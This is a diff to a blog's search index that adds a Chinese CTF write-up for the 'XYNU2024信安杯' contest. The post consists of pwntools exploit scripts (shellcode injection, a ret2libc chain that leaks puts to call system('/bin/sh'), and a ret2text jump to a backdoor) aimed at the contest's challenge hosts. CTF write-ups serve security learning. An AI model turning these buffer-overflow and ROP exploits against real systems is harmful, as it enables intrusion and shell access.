@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>XYNU2024信安杯</title>
+      <link href="/2025/08/24/XYNU2024%E4%BF%A1%E5%AE%89%E6%9D%AF/"/>
+      <url>/2025/08/24/XYNU2024%E4%BF%A1%E5%AE%89%E6%9D%AF/</url>
+      
+        <content type="html"><![CDATA[<p>全是简单题目，直接上exp</p><h1 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h1><p>直接nc连接，然后ls+cat flag即可。</p><h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">io=remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20029</span>)</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ezret2libc&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20030</span>)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">rdi=<span class="number">0x0401209</span></span><br><span class="line">ret=<span class="number">0x040101a</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(<span class="number">0x70</span>+<span class="number">8</span>)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line"></span><br><span class="line">libc_base=puts-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload=cyclic(<span class="number">0x70</span>+<span class="number">8</span>)+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)+p64(main)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io=remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20033</span>)</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x401200</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(<span class="number">0x8</span>+<span class="number">8</span>)+p64(ret)+p64(backdoor)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 比赛 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ctf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ctfshow-pwn入门</title>
       <link href="/2025/08/24/ctfshow-pwn%E5%85%A5%E9%97%A8/"/>
       <url>/2025/08/24/ctfshow-pwn%E5%85%A5%E9%97%A8/</url>
